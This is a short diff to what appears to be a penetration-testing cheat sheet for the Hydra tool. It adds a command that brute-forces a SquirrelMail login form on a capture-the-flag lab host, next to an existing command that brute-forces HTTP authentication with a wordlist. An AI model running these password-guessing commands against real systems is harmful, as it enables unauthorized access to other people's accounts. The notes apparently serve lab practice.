@@ -18,6 +18,10 @@ Help for the module: `hydra http-get-form -U`
 Syntax: `<url>:<form parameters>[:<optional>[:<optional>]:<condition string>`
 
 ```sh
+hydra -V -l milesdyson -P log1.txt skynet.thm http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect"
+```
+
+```sh
 hydra -V -t 50 -l admin -P /usr/share/wordlists/fasttrack.txt http-get admin.ironcorp.me -s 11025
 ```
 
